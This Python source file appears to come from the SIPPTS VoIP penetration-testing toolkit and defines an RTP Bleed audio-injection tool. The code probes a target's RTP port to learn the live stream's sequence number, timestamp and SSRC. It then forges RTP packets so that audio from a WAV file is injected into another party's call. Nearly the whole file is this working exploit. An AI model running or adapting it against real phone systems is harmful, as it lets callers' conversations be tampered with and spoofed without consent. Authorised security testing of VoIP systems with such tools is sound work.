#!/usr/bin/env python3
# -*- coding: utf-8 -*-

__author__ = 'Jose Luis Verdeguer'
__version__ = '3.3'
__license__ = "GPL"
__copyright__ = "Copyright (C) 2015-2022, SIPPTS"
__email__ = "pepeluxx@gmail.com"

import socket
import fcntl
import os
import sys
import time
from .lib.color import Color
from .lib.logos import Logo


class RTPBleedInject:
    def __init__(self):
        self.ip = ''
        self.port = ''
        self.payload = '0'
        self.file = ''

        self.c = Color()

    def start(self):
        self.port = int(self.port)

        logo = Logo('rtpbleedinject')
        logo.print()

        print(self.c.BWHITE + '[✓] Target IP: ' +
              self.c.YELLOW + '%s' % self.ip)
        print(self.c.BWHITE + '[✓] Target port:' +
              self.c.YELLOW + ' %d' % self.port)
        print(self.c.BWHITE + '[✓] Payload type: ' +
              self.c.YELLOW + '%d' % self.payload)
        print(self.c.BWHITE + '[✓] WAV file ' +
              self.c.YELLOW + '%s' % self.file)
        print(self.c.WHITE)

        print(self.c.YELLOW + '[+] Reading WAV file ...' + self.c.WHITE)

        file = open(self.file, "rb")
        data = file.read()
        file.close()
        print(self.c.YELLOW + '[+] Sending RTP packets to ' + self.c.CYAN + '%s' % self.ip + self.c.WHITE + ':' +
              self.c.CYAN + '%d' % self.port + self.c.WHITE + ' to obtain info about the streams' + self.c.WHITE)

        # Create a UDP socket
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        except socket.error:
            print(self.c.RED + 'Failed to create socket' + self.c.WHITE)
            sys.exit(1)
        fcntl.fcntl(sock, fcntl.F_SETFL, os.O_NONBLOCK)

        host = (str(self.ip), self.port)
        nloop = 0
        size = 0

        while size < 12:
            try:
                nloop += 1
                cloop = hex(nloop)[2:]
                cloop = cloop.zfill(4)
                cpayload = '%s' % hex(0x80 | self.payload & 0x7F)[2:]
                # byte[0] = 0x80 => RTP version 2
                # byte[1] = 0x80+payload => Codec version (https://en.wikipedia.org/wiki/RTP_payload_formats)
                # byte[2-3] = Sequence number
                message = ('80'+cpayload+cloop+'0000000000000000')
                byte_array = bytearray.fromhex(message)

                if nloop == 65535:
                    nloop = 1

                # Send data
                sock.sendto(byte_array, host)

                (msg, addr) = sock.recvfrom(4096)
                (ipaddr, rport) = addr
                size = len(msg)
                msg = msg.hex()

                if size >= 12:
                    seq = msg[4:8]
                    timestamp = msg[8:16]
                    ssrc = msg[16:24]
                    version = '8000'

                    print(self.c.BWHITE + '[-] Received %d bytes from target port %d with seq number %s' %
                          (size, rport, seq))
                    print(self.c.BWHITE +
                          '[-] Current Seq: ' + self.c.GREEN + '%s' % seq)
                    print(
                        self.c.BWHITE + '[-] Current Timestamp: ' + self.c.GREEN + '%s' % timestamp)
                    print(self.c.BWHITE + '[-] SSRC: ' +
                          self.c.GREEN + '%s' % ssrc)
                    print(self.c.BWHITE +
                          '[-] Version: ' + self.c.GREEN + '%s' % version)

                    total = len(data) * 2
                    cont = 0
                    hexdata = data.hex()
                    size = 160

                    print(
                        self.c.YELLOW + '[+] Injecting RTP audio ...' + self.c.WHITE)

                    while cont-size < total:
                        packet = hexdata[cont:cont+(size*2)]

                        nseq = int('%s' % seq, base=16) + 1
                        seq = hex(nseq)[2:].zfill(4)

                        ntimestamp = int('%s' % timestamp, base=16) + size
                        timestamp = hex(ntimestamp)[2:].zfill(8)

                        print(self.c.YELLOW + '[+] Sending packet %d of %d (version: %s, seq: %s, timestamp: %s, ssrc: %s)' %
                              (cont, total, version, seq, timestamp, ssrc), end="\r")

                        # packet_bytes = 2+2+4+8+8+360 = 24 + 320 = 344
                        packet_bytes = '%s%s%s%s%s' % (
                            version, seq, timestamp, ssrc, packet)
                        byte_array = bytearray.fromhex(packet_bytes)
                        # Send data
                        sock.sendto(byte_array, host)
                        time.sleep(size/11000.0)

                        cont += (size*2)
            except KeyboardInterrupt:
                print(self.c.YELLOW + 'You pressed Ctrl+C!')
                exit()
            except:
                pass

        print(self.c.WHITE)
        sock.close()
